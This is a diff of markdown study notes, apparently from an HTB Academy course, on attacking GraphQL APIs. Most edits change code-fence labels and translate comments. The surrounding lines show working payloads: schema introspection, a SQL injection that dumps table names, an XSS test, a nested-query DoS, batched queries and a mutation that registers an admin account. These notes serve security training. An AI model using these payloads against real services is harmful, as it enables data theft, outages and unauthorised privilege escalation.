@@ -10,7 +10,7 @@ tags: ['cybersecurity', 'htb-academy', 'course-notes']
 
 ## basic
 
-```json
+```graphql
 {
   users {
     id
@@ -24,17 +24,17 @@ tags: ['cybersecurity', 'htb-academy', 'course-notes']
     id
     username
     role
-    password // bisa ditambah!!
+    password // can be added
   }
 }
 ```
 
-Tool: [graphw00f]([dolevf/graphw00f: graphw00f is GraphQL Server Engine Fingerprinting utility for software security professionals looking to learn more about what technology is behind a given GraphQL endpoint.](https://github.com/dolevf/graphw00f))
+Tool: [graphw00f](https://github.com/dolevf/graphw00f)
 
 ## Introspection
 
 identify all GraphQL types supported by the backend
-```json
+```graphql
 {
   __schema {
     types {
@@ -45,7 +45,7 @@ identify all GraphQL types supported by the backend
 ```
 
 follow up and obtain the name of all of the type's fields. ganti UserObject jadi jenis object apapun
-```json
+```graphql
 {
   __type(name: "UserObject") {
     name
@@ -61,7 +61,7 @@ follow up and obtain the name of all of the type's fields. ganti UserObject jadi
 ```
 
 obtain all the queries supported by the backend
-```json
+```graphql
 {
   __schema {
     queryType {
@@ -75,7 +75,7 @@ obtain all the queries supported by the backend
 ```
 
 general introspection
-```json
+```graphql
 query IntrospectionQuery {
       __schema {
         queryType { name }
@@ -178,7 +178,7 @@ query IntrospectionQuery {
 obvious
 
 ### SQLi
-```json
+```graphql
 {
   user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
     username
@@ -188,14 +188,14 @@ obvious
 
 ### XSS
 obvious
-```json
+```graphql
 {
 	"query": "{user(username: \"<script>alert(1)</script>\") {uuid username role}}"
 }
 ```
 
 ### DoS
-```json
+```graphql
 {
   posts {
     author {
@@ -207,7 +207,7 @@ obvious
 
 ### Batching Attacks
 executing multiple queries with a single request
-```json
+```graphql
 [
 	{
 		"query":"{user(username: \"admin\") {uuid}}"
@@ -220,7 +220,7 @@ executing multiple queries with a single request
 
 ## Mutation
 GraphQL queries that modify server data
-```json
+```graphql
 query {
   __schema {
     mutationType {
@@ -279,7 +279,7 @@ Identify from mutation, which object can be mutated.
  
 Use introspection to get object data type, then try to register
 
-```json
+```graphql
 mutation {
   registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
     user {
@@ -294,7 +294,7 @@ mutation {
 
 As role admin 
 
-```json
+```graphql
 mutation {
   registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
     user {
